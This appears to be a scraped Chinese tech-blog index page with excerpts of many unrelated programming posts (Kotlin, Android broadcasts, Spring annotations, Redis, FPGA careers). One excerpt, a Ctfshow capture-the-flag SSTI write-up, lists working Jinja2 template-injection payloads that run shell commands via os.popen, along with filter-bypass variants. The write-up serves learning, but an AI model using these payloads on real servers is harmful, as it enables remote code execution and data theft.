fun lastElement(str: String): Char { return str[str.length - 1] } 上面的代码是之前用过的，意思是获取字符串的最后一个字符，其中参数类型是String，返回值类型是Char，将其抽出来就是【String -&gt; Char】这就代表了函数的类型，一句话概括就是：将函数的【参数类型】和【返回值类型】抽象出来就得到了函数的【函数类型】。【(String) -&gt; Char】的意思就是参数类型是【String】，返回值类型是【Char】的函数类型。这个比较好理解。类似的还有Kotlin中继承自BaseAdapter的几个方法
//函数类型：() -&gt; Int override fun getCount(): Int { } //函数类型：(Int) -&gt; Any override fun getItem(position: Int): Any { } //函数类型：(Int) -&gt; Long override fun getItemId(position: Int): Long { } 2.高阶函数 理解饿了函数类型再来看下高阶函数。
高阶函数是将函数用作参数或返回值的函数， 这是高阶函数的定义。
函数用作参数的高阶函数写法 fun main() { val result = answer(20) { 10 } println("result:$result") //输出结果：result:30 } /** * 高阶函数 * 函数类型：(Int, add方法) -&gt; Int */ fun answer(num: Int, add: () -&gt; Int): Int { return num + add() } 上面的代码用的是高阶函数中的函数用作参数的写法，定义一个answer方法，添加一个参数num和函数add，因为add方法返回值是一个Int类型因此可以跟num直接相加并返回结果，代码没有实际意义就是个例子。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a28686abeafb304f39dd806e84650ea4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16b48fe454e7be5e90fbbbc03a53b5d2/" rel="bookmark">
			android查漏补缺（8）Android广播不同种类介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 按照是否有序分类
1，普通广播（无序广播）
广播按照逻辑上同一时刻（实际可能被CPU按照抢占式任务无序发给注册模块）发送给注册模块
#发送方法： Context.sendBroadcast() 2，有序广播
广播按照注册模块的优先级有序的发给注册模块，优先级越高，值越大，就越被优先接收
#发送方法： Context.sendOrderedBroadcast() #优先级判断方法（priority="999"表示最高优先级）： &lt;receiver android:name="com.broadcast.receiver.SortBroadcastReceiverA"&gt; &lt;intent-filter android:priority="999"&gt; &lt;action android:name="com.broadcast.test"/&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 按照是否动态分类
1，静态广播
静态广播直接被注册到androidmanifest.xml中，特点是即使app没有启动，广播接收器也能接收到广播消息。
静态广播： &lt;receiver android:name="com.broadcast.receiver.testReceiver"&gt; &lt;intent-filter &gt; &lt;action android:name="com.broadcast.test"/&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 2，动态广播
在其他组件的生命周期中动态创建广播接收器，特点是广播接收器也有生命周期，需要进行创建和销毁，应用推出后无法再收到广播。最后动态注册的广播需要使用隐式intent进行发送，静态注册的显示隐式都可以。
//注册广播 IntentFilter counterActionFilter = new IntentFilter(NEW_LIFEFORM_DETECTED); receiver = new UnSortBroadcastReceiver(); registerReceiver(receiver, counterActionFilter); intent分类
1，显示intent
Intent intent = new Intent(this,ActNextActivity.class)//创建一个目标确定的意图 2，隐式intent
//设置意图动作为准备拨号 intent.setAction(Intent.ACTION_DIAL); Uri uri = Uri.parse("tel:"+phoneNo); intent.setData(uri); startActivity(intent); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/601c68c6911d84e8b314186b8c5e5289/" rel="bookmark">
			纯前端 导出Excel文件的 方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在纯前端导出文件的一种常见方法是通过生成下载链接来实现，可以使用Blob对象和URL.createObjectURL()方法来实现,因为现在工作中主要运用的前端框架是Angular，这篇文章将以angular为例进行阐述。
一、示例代码 1. 首先，安装FileSaver库（https://github.com/eligrey/FileSaver.js/）来方便地处理文件下载：
npm install file-saver --save npm install xlsx --save npm install xlsx-js-style --save 2. 在你的Angular组件中，导入必要的模块和依赖项：
import { Component } from '@angular/core'; import { saveAs } from 'file-saver'; import * as XLSX from 'xlsx'; import * as XLSXStyle from 'xlsx-js-style'; 3. 创建一个函数来生成和导出文件：
exportFile() { // 创建需要导出的数据 const data = '这是要导出的纯前端内容。'; // 将数据保存为Blob对象 const blob = new Blob([data], { type: 'text/plain;charset=utf-8' }); // 使用FileSaver库保存Blob对象为文件 saveAs(blob, '导出文件.txt'); } 4. 在组件的模板中添加一个按钮或其他交互元素，并将函数绑定到点击事件上：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/601c68c6911d84e8b314186b8c5e5289/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ee45537f23710f0cfb6b846ad338a51/" rel="bookmark">
			搭建AutoSAR开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 开发板准备理论知识准备工具链准备SIPDaVinci DeveloperDaVinci ConfiguratorEB Tresos StudioS32 Design Studio for ARMIAR获取途径 软件环境安装参考 任何开发都需要一套开发环境，包括软硬件环境，笔者后续将介绍的是 NXP 的 S32K144 配套的开发板。
接下来详细介绍怎么获取这些软硬件工具。仅供个人学习使用！
开发板准备 笔者选用的是 NXP 官方开发板，S32K144-Q100 汽车通用评估板，官方很多 demo 案例都是基于这款开发板来写的。
数据手册：S32K1XX, S32K1xx Data Sheet (cirmall.com)
原理图资料：S32K144-Q100 汽车通用评估板 |恩智浦半导体 (nxp.com)
可以去官方购买，或者去某鱼上面淘二手的，笔者购买的便是二手的，比较实惠！
理论知识准备 想了解更多 AutoSAR 理论知识，可以前往B站，这位UP主有几期视频介绍得比较好，免费，链接如下：
会开车的鸟哥的个人空间_哔哩哔哩_bilibili
还有一位博主，介绍得也比较有趣，不过感觉文章的顺序有点乱，该博主用的开发板是瑞萨RH850系列的，部分付费。
#AUTOSAR揭秘 (qq.com)
相信看完上述 2 位大佬的文章或视频，对 AutoSAR 多多少少都会有所认识了，这时候是不是摩拳擦掌想着动手实践一番。
对于初学者，当你了解了基本的理论概念之后，如果有一套工具让我们摸清其操作、把工具用起来，会显得更迫切、更重要。
工具链准备 SIP 使用 AutoSAR CP 开发，为了软件的效率和质量，我们很少去编写基本的代码，一般都是去购买供应商的通用 AutoSAR 架构的代码包。
前面其他博主也介绍到了，咱们需要有一个叫 SIP 包的东西，即 Software Integration Package，是 Tier1 在做 AutoSAR 项目前，向 Vector 公司购买集成了 AutoSAR 方案的软件包，Vector 最终交付给 Tire1 时的软件包就是 SIP 包。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ee45537f23710f0cfb6b846ad338a51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0e2d28fc11fa10e42d1ce6335307794/" rel="bookmark">
			postman传参与接参
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		后端接收前端参数是用到的注解：@PathVariable，@RequestParam，@RequestBody
一、@PathVariable 直译：路径变量
@PathVariable是spring3.0的一个新功能：接收请求路径中占位符的值
二、@RequestParam直译：请求参数
作用：就是把请求中的指定名称的参数传递给控制器中的形参赋值 属性：1. value / name：请求参数中的名称 （必写参数）
2. required：请求参数中是否必须提供此参数，默认值是true，true为必须提供
3. defaultValue：默认值
添加属性的用法：
通过@RequestParam(required = false)设置为非必传。因为required值默认是true，所以默认必传
通过@RequestParam("workID")或者@RequestParam(value = "workID")指定参数名
通过@RequestParam(defaultValue = "0")指定参数默认值
@RequestParam用来处理 Content-Type 为 application/x-www-form-urlencoded 编码的内容，Content-Type默认为该属性。@RequestParam也可用于其它类型的请求，例如：POST、DELETE等请求。
所以在postman中，要选择body的类型为 x-www-form-urlencoded，这样在headers中就自动变为了 Content-Type : application/x-www-form-urlencoded 编码格式。
但是这样不支持批量插入数据啊，如果改用 json 字符串来传值的话，类型设置为 application/json，点击发送的话，会报错，后台接收不到值，为 null。
三、@RequestBody直译：请求体
作用:
1.@RequestBody主要用来接收前端传递给后端的json字符串中的数据的(请求体中的数据的)；
2.GET方式无请求体，所以使用@RequestBody接收数据时，前端不能使用GET方式提交数据，而是用POST方式进行提交。
3.在后端的同一个接收方法里，@RequestBody与@RequestParam()可以同时使用，@RequestBody最多只能有一个，而@RequestParam()可以有多个。
注：当同时使用@RequestParam（）和@RequestBody时，@RequestParam（）指定的参数可以是普通元素、
数组、集合、对象等等(即:当，@RequestBody 与@RequestParam()可以同时使用时，原SpringMVC接收
参数的机制不变，只不过RequestBody 接收的是请求体里面的数据；而RequestParam接收的是key-value
里面的参数，所以它会被切面进行处理从而可以用普通元素、数组、集合、对象等接收)。
即：如果参数时放在请求体中，传入后台的话，那么后台要用@RequestBody才能接收到；如果不是放在
请求体中的话，那么后台接收前台传过来的参数时，要用@RequestParam来接收，或则形参前
什么也不写也能接收。
注：如果参数前写了@RequestParam(xxx)，那么前端必须有对应的xxx名字才行(不管其是否有值，当然可以通
过设置该注解的required属性来调节是否必须传)，如果没有xxx名的话，那么请求会出错，报400。
注：如果参数前不写@RequestParam(xxx)的话，那么就前端可以有可以没有对应的xxx名字才行，如果有xxx名
的话，那么就会自动匹配；没有的话，请求也能正确发送。
追注：这里与feign消费服务时不同；feign消费服务时，如果参数前什么也不写，那么会被默认是
@RequestBody的。
如果后端参数是一个对象，且该参数前是以@RequestBody修饰的，那么前端传递json参数时，必须满足以下要求：
后端@RequestBody注解对应的类在将HTTP的输入流(含请求体)装配到目标类(即：@RequestBody后面的类)时，会根据json字符串中的key来匹配对应实体类的属性，如果匹配一致且json中的该key对应的值符合(或可转换为)，这一条我会在下面详细分析，其他的都可简单略过，但是本文末的核心逻辑代码以及几个结论一定要看！ 实体类的对应属性的类型要求时,会调用实体类的setter方法将值赋给该属性。
json字符串中，如果value为""的话，后端对应属性如果是String类型的，那么接受到的就是""，如果是后端属性的类型是Integer、Double等类型，那么接收到的就是null。
json字符串中，如果value为null的话，后端对应收到的就是null。
如果某个参数没有value的话，在传json字符串给后端时，要么干脆就不把该字段写到json字符串中；要么写value时， 必须有值，null 或""都行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0e2d28fc11fa10e42d1ce6335307794/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fd9e8c47bef0c816ed952d08a724532/" rel="bookmark">
			Sublime Text3的快捷键(windows)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Ctrl+O可以打开当前你编辑的文件所在文件夹
2、Ctrl+L可以选中当前一行，多次Ctrl+L就会选中多行
3、Alt+F3可以同时选中多个相同名称，然后就可以同时修改啦。或者连续Ctrl+D也可以，当然还是Alt+F3快。
4、先选中一片区域，然后Ctrl+Shift+L一片区域同时编译
5、先选中一片区域，然后Ctrl+J一片区域合并为一行
6、Ctrl+P输入：@ss跳转到ss符号所在位置
#key跳转到key关键字所在位置
:10跳转到第10行
7、Ctrl+Shift+Enter在当前行上面增加一行并且跳到该行
8、Ctrl+←/→逐词移动，Ctrl+Shift+←/→逐词选择
9、Ctrl+↑/↓移动当前区域，Ctrl+Shift+↑/↓移动当前行
10、Alt+Shift+2进行左右分屏，Alt+Shift+3分竖三屏，Alt+Shift+4分竖四屏，Alt+Shift+5分三屏，Alt+Shift+8分上下屏
————————————————
版权声明：本文为CSDN博主「Eveweiscsdn」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/wangweiscsdn/article/details/53689996
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f19ee411b9d5f5a9ae8b9d800c5f545/" rel="bookmark">
			【Ant Design合集】自用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		a-input 1. @search 与 @pressEnter 的设计区别 @search 是与a-input-search绑定一起的，点击按钮和回车触发事件，关联有：
enter-button：是否确认按钮（与addon自定义按钮冲突）
loading：搜索loading（主要起到防抖作用）
@pressEnter 是 直接的回车事件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce780ddff175c5f1918c5b90b887ec9e/" rel="bookmark">
			vue3&#43;ts实现视频根据时间轴截取，并可以通过传入截取起止时间进行当前剪辑的回显
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司提出想做一个视频编辑功能，每次只裁剪一段即可，UI同时也想实现时间轴为关键帧图片的效果，从网上也没找到合适的组件，简单思考后觉得并不难，决定自己封装一个吧。组件涉及到的只有vue3+ts+scss，没有使用其他插件。
穿插一个简化版本，时间轴是一条线，功能比这个简化，或许会符合部分人的需求。 链接vue3+ts实现视频根据时间轴截取_vue项目截取一段正在播放的视频_一个人的咖啡~的博客-CSDN博客
功能概述 通过传入源视频时长，源视频的视频地址，当前剪辑的开始时间，当前剪辑的结束时间和关键帧缩略图（需要20张图片，后端提供，根据视频时长分为20节，每节取一张图）五个必传参数，视频地址将通过video标签播放，组件尺寸为100%，根据父级组件的宽度自动撑满。
时间轴模块，会根据传入的起止时间自动换算出1px===毫秒数，起止时间间隔我设置了1秒以上，开始时间拖动到结束时间前一秒左右将停止移动，结束时间拖动到开始时间后一秒左右将无法拖动，拖动开始时间时会自动将video标签的开始播放时间定位到截取的开始时间，设置结束时间后，video播放到截取的结束时间后会自动暂停，这时video标签将只能播放所截取的起止时间范围的视频。最后设置了回调queryTime()，通过回调将起止时间传出，我的业务中视频截取是后端操作，前端只需要提供截取的起止时间即可，具体看代码，如下：
参数描述 endTime视频结束时间，精确到毫秒url视频地址，将通过video标签展示spliterStartTime视频截取开始时间spliterEndTime视频截取结束时间photoList时间轴缩略图列表 回调描述 回调方法回调参数（形参）参数描述queryTimeArray[开始时间，结束时间] template部分 &lt;template&gt; &lt;video id="videoPlayer" @play="onplay" controls="true" preload="auto" muted class="video" width="100%" :src="props.url"&gt;&lt;/video&gt; &lt;ul class="time-list"&gt; &lt;li v-for="item in data.timeList" :key="item"&gt;{{item}}&lt;/li&gt; &lt;/ul&gt; &lt;div class="crop-filter"&gt; &lt;div class="timer-shaft" ref="shaft"&gt; &lt;div class="white-shade" :style="{width:(data.endLeft-data.startLeft+12)+'px',left:data.startLeft-6+'px'}"&gt; &lt;/div&gt; &lt;div class="left-shade" :style="{width: (data.startLeft-6)+'px'}"&gt;&lt;/div&gt; &lt;div class="right-shade" :style="{width: (shaft?.clientWidth-data.endLeft-6) +'px'}"&gt;&lt;/div&gt; &lt;div class="strat-circle circle" ref="start" @mousedown="startMouseDown"&gt; &lt;div class="center"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="end-circle circle" ref="end" @mousedown="endMouseDown"&gt; &lt;div class="center"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 此处src应绑定item --&gt; &lt;img @dragstart.prevent style="width: 5%;user-select: none;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce780ddff175c5f1918c5b90b887ec9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/156d644889dec350d1edce4725a36bd0/" rel="bookmark">
			为什么FPGA的薪资可以那么高？FPGA怎么学习？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近两年FPGA被逐步推向风口，凭借其自身的可编程优势，在众多芯片类型中脱颖而出，根据相关数据显示FPGA工程师给应届毕业生的平均薪资是9k~12k，三年到四年的FPGA工程师22k~29k的薪资，工作8年以上的FPGA工程师更是拿到46k~50k的高薪。
额外还有分红、包吃包住等丰厚待遇等等，那导致FPGA薪资高的原因主要是：
1、入门难，培养周期长，
FPGA开发不仅需要掌握基本的HDL语言，还需要了解硬件电路的调试和原理图。数字电路知识也是必备的，因为只有具备一定的硬件思维，才能确保代码的覆盖率和资源利用率。
然而，由于高校资源有限，大部分电子专业的学生只能选择学习单片机、ARM等方向，或者专注于硬件方面的知识。
此外，高校老师在FPGA开发方面的投入时间和精力也相对有限，因此很难实现从实践角度教授学生相关知识和流程。
2、开发成本高
与单片机相比，FPGA的价格较高。以使用的Xilinx K7系列芯片为例，性能最差的70T芯片价格也要七八十一片。此外，FPGA的开发周期较长，即使程序中只改动了标点符号，重新编译也需要很长时间（视工程大小而定）。仿真结果有时与实际结果不符，主要是由于时序问题和仿真代码覆盖率限制。因此，很多功能还需要在实际板上进行测试。例如，在高低温老化测试中，有时温度过高会导致DDR无法在常温下发挥高速率，而降低频率又会影响带宽。优化最后百分之十的性能需要付出的努力不亚于前面百分之九十的。
由于高的开发成本，FPGA并不受资本青睐，换句话说，能用ARM、DSP或纯硬件解决的问题就不需要使用FPGA。正因如此，企业在招聘时对应聘者的技术要求较高。
3、FPGA工程师招聘困难
几年前，由于FPGA岗位较少，导致大多数学生不愿涉足这个冷门且难以掌握的领域。此外，人才培养未能跟上市场需求的增长。前面两点导致了FPGA岗位供需不平衡的现象。
然而，近年来随着半导体行业的发展以及一些高性能产品产业的兴起，FPGA的应用也相应增长，市场对FPGA工程师的需求逐年增加（具体数据可查阅相关资料）。但由于FPGA从业者的培养周期较长，FPGA方面的人才增长速度并未紧跟岗位增加。一些行业领军人物甚至被大厂提前挖走。
此外，部分大厂与高校EDA实验室合作，直接预定学生毕业后的工作归属，所以企业在招聘市场上的候选人数量非常有限。
因此才导致FPGA的薪资高于大多数行业。
FPGA工程师的工作：
一般来说FPGA工程师主要需要负责以下工作：
1.负责FPGA软件代码编写、模块设计及仿真；
2.FPGA硬件调试，以满足各种需要的功能及性能；
3.进行系统的功能定义，算法实现；
4.分析并解决开发过程中的问题，FPGA的资源及时序优化；
5.配合软、硬件设计人员完成相关任务目标；
6.完成方案文档、项目文档、质量记录及相关文档；
7.协助测试工程师制定测试计划，定位发现的问题。
FPGA的学习：
1、数电（必须掌握的基础），然后进阶模电，
2、掌握HDL（HDL=verilog+VHDL）可以选择verilog或者VHDL，学完后学System Verilog，
3、掌握FPGA设计流程/原理（推荐教材：FPGA权威指南、Altera FPGA/CPLD设计、IP核芯志-数字逻辑设计思想、静态时序分析、嵌入式逻辑分析仪等），
4、常用的协议（ARP协议、udp协议、SPI、AXI总线等等）够用就行，
5、独立的完成中小规模的设计，比如：像交通灯、电子琴、DDS等......
6、根据工作领域选择专业知识：比如：通信--信号与系统、数字信号处理、通信原理、移动通信基础......比如：CPU--计算机组成原理、计算机体系结构、编译原理.......等。
这里有一个入口：fpga学习资料领取
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e73076cb8ca1f16fe9fd555fbeb920d/" rel="bookmark">
			电脑自动重启关闭
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.ijinshan.com/pcyouhua/paper_20220513101551.shtml
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b631ee63a56956eebb4dba3c6502e92c/" rel="bookmark">
			WinServer 2012 R2 AD 组策略 禁止域用户离线缓存登陆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存登录主要是为了解决当公司域控制器发生故障联系不上DC或用户拿笔记本电脑回家不拔VPN的情况下，依然能够登录到系统。如果用户登录的时候联系不到DC，那么就凭用户登录时输入的用户名和密码去缓存中校验，如果能联系上DC就不会使用缓存技术。
默认情况下不做任何设置，客户端可以缓存10个域账号，最多可以缓存50个域账号，理论上缓存时间为永久，缓存位置如下：
1、域账号信息如下
用户计算机组织单位权限组zhangsanzhangsanxielongdomain usersh.itITdomain admins （1）以管理员运行注册表 找到 KEY_LOCAL_MACHINE → SECUITY
（2）默认管理员是没有 SECURITY 权限的，需要给管理员添加权限
（3）添加权限 3、刷新后查看，默认情况下，客户端可以缓存10个域账号，如下图所示 NL$1 至 NL$10
（1）红线标注的NL$1，NL$2 说明已经有2个域账号登陆已被缓存，本例分别是 zhangsan 跟 管理员 sh.it，因为之前已经登陆过。
（2）我们尝试关掉DC服务器，然后把上面的2个红线标注的Key删除后，在试着登陆，提示无法登陆，因为这时缓存已经被我们手动删除了。而且DC也被关闭了，所以这时就无法登陆了。
这里如果把上面NL&amp;开头的1-10项和NL&amp;Control 删除，重启电脑的时候会自动重新生成新的 10个Key
4、我们也可以在DC服务器通过组策略统一设置，方法如下：
（1）在OU下面创建一个GPO，注意这里要把计算机也要放到这个OU下面，因为设置的是计算机
（2） 计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 安全选项 → 交互式登陆：之前登录到缓存的次数（域控制器不可用时）
(3) 将不要缓存登陆次数设为 0
（4）强制更新组策略，DC服务器跟客户端分别执行
gpupdate /force
5、我们把 DC1 关机
6、 客户端开机再次登陆，已无法登陆
7、把DC1开机后，客户端成功登陆
8、此时发现 Cache 里面没有缓存 NL$1 至 NL$10 的值，所以也就无法缓存登陆了，注意这里只是隐藏了，如果你把组策略移除，缓存值还是会复原的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cae72936288ec90e63d0e156ab36aa93/" rel="bookmark">
			ubuntu20.04蓝牙连接airpods
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu20.04蓝牙连接airpods 解禁蓝牙安装blueman设置模式连接上没有声音的问题 解禁蓝牙 sudo rmmod btusb sleep 1 sudo modprobe btusb sudo /etc/init.d/bluetooth restart 安装blueman sudo apt install blueman sudo apt-get install pulseaudio-module-bluetooth sudo service bluetooth restart 设置模式 sudo gedit /etc/bluetooth/main.conf #设定ControllerMode = bredr sudo /etc/init.d/bluetooth restart 长按airpods上的按钮
连接上没有声音的问题 开启过度增益，将声音开最大
参考文章
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7be85138bbd916c15c6508264cf9dc4/" rel="bookmark">
			Solidworks突然无法打开：无法获得下列许可 solidworks standard 无法连接到服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 当启动SolidWorks时，突然出现无法获得下列许可 solidworks standard 无法连接到服务器提示。解决办法如下。
第一步：打开任务管理器，点击服务，找到以下两个选项。
第二步：选中并启动这两个已停止的项目即可。
此时，SolidWorks即可正常打开。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff3073298efb76fca9aeb1f813baf2de/" rel="bookmark">
			【Web】Ctfshow SSTI刷题记录1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
①web361 362-无过滤
②web363-过滤单双引号
③web364-过滤单双引号和args
④web365-过滤中括号[]、单双引号、args
⑤web366-过滤单双引号、args、中括号[]、下划线
⑦web367-过滤单双引号、args、中括号[]、下划线、os
⑧web368-过滤单双引号、args、中括号[]、下划线、os、{{
⑨web369-过滤单双引号、args、中括号[]、下划线、os、{{、request
⑩web370-过滤单双引号、args、中括号[]、下划线、os、{{、request、数字
①web361 362-无过滤 题目给到Hint,尝试传?name={{1-1}}测试出ssti注入点 掏出武器库秒了（上文有总结）
?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('tac /f*').read()")}}
或者
?name={{url_for.__globals__.os.popen('tac /f*').read()}}
②web363-过滤单双引号 ?a=os&amp;b=popen&amp;c=cat /flag&amp;name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
或者
?a=tac /f*&amp;name={{url_for.__globals__.os.popen(request.args.a).read()}}
③web364-过滤单双引号和args ?a=os&amp;b=popen&amp;c=cat /flag&amp;name={{url_for.__globals__[request.values.a][request.values.b](request.values.c).read()}}
或者
?a=tac /f*&amp;name={{url_for.__globals__.os.popen(request.values.a).read()}}
④web365-过滤中括号[]、单双引号、args ?c=cat /flag&amp;name={{url_for.__globals__.os.popen(request.values.c).read()}}
⑤web366-过滤单双引号、args、中括号[]、下划线 ?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
Cookie:a=__globals__;b=cat /flag
⑦web367-过滤单双引号、args、中括号[]、下划线、os ?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag
⑧web368-过滤单双引号、args、中括号[]、下划线、os、{{ 使用{%%}绕过,再借助print()回显
?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name={% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}
⑨web369-过滤单双引号、args、中括号[]、下划线、os、{{、request ?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff3073298efb76fca9aeb1f813baf2de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca45c1309ff3e77484b5e976bbd5d7d1/" rel="bookmark">
			Redis高级篇（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Redis持久化 Redis有两种持久化方案：RDB持久化、AOF持久化
1.1.RDB持久化 什么是RDB持久化
RDB 持久化是指 Redis 可以通过创建快照，来获得存储在内存里面的数据在 某个时间点 上的副本。Redis 得到副本之后，可以将副本留在当前服务器，在重启服务器或者服务器故障的时候使用，也可以将副本复制到其他服务器，从而创建具有相同数据的服务器副本，比如将副本从主库复制到从库一份。快照文件称为 RDB 文件，默认是保存在当前运行目录。
RDB的缺点
RDB 执行间隔时间长，两次 RDB 之间写入数据有丢失的风险
fork 子进程、压缩、写出 RDB 文件都比较耗时
1.1.1.执行时机 RDB 持久化在四种情况下会执行：
执行 save 命令
执行 bgsave 命令
Redis 停机时，触发 save 命令
触发 RDB 条件时，Redis就会自动触发 bgsave 命令
1）save 命令
执行下面的命令，可以立即执行一次 RDB，save 命令会导致主进程执行 RDB，这个过程中其它所有命令都会被阻塞。只有在数据迁移时可能用到。
2）bgsave命令
下面的命令可以异步执行RDB：
这个命令执行后会开启独立进程完成RDB，主进程可以持续处理用户请求，不受影响。
3）停机时
Redis停机时会执行一次save命令，实现RDB持久化。
4）触发RDB条件
Redis内部有触发RDB的机制，可以在redis.conf文件中找到，格式如下：
# 900秒内，如果至少有1个key被修改，则执行bgsave ， 如果是save "" 则表示禁用RDB save 900 1 save 300 10 save 60 10000 RDB的其它配置也可以在redis.conf文件中设置：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca45c1309ff3e77484b5e976bbd5d7d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/145576bc22392a960408e4f4bc2e6471/" rel="bookmark">
			第三十一周：文献阅读&#43;SVM模型&#43;CNN反向传播
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
摘要
Abstract
文献阅读：支持向量机与ARIMA模型在环境噪声水平时序预测中的比较
现有问题
研究要点
相关知识：SVM（支持向量机）模型
1. 概念
2. 画线标准
3. SVM超平面公式推导
5. 求解SVM超平面实例
实验设计
1. 数据集
2. 定义模型精度的参数
3. 实验设置
4. 实验结果
结论
CNN反向传播
SVM实现线性分类
总结
摘要 本周阅读的文献从环境噪声水平的时序预测出发，对SVM和ARIMA模型进行了比较，选择出更适合的时间序列方法。通过实验对比，SVM模型因其具有的极大边际概念、十倍交叉验证和对非线性的适应性，因此在时序预测方面优于ARIMA模型。SVM是一类按监督学习方式对数据进行二元分类的广义线性分类器，利用画出来的超平面可以很好地区分两个类别。通过拉格朗日对偶性和KKT条件推导出SVM的超平面计算，并将其计算原理应用到实例。除此之外，在梯度下降法的基础上，通过上周CNN正向传播的例子继续计算CNN反向传播，根据计算结果可以发现卷积层反向传播的计算规律。
Abstract This week's article compares the SVM and ARIMA models to select a more suitable time series method from the perspective of time series prediction of environmental noise levels. Through experimental comparison, SVM model is superior to ARIMA model in time series prediction because of its large margin concept, ten-fold cross-validation and adaptability to nonlinearity.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/145576bc22392a960408e4f4bc2e6471/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/287159c4c7c0425acaa5b374c265bc88/" rel="bookmark">
			抖音点赞取消点赞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f8b16b09b01cc16dc70784fda52dcbb/" rel="bookmark">
			多种LLM的API使用及开发流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ChatGPT 调用 OpenAI API 是付费服务，需要先获取 OpenAI API Key，之后才能在应用中访问 ChatGPT。首先需要在OpenAI注册账号(登录注册需要科学的上网手段，有可靠方法可留言)，如果能成功注册就可以获得一个 OpenAI API KEY，将这个 key 保存到一个.env文件中，将这个文件放到项目根目录下。
读取.env 文件代码：
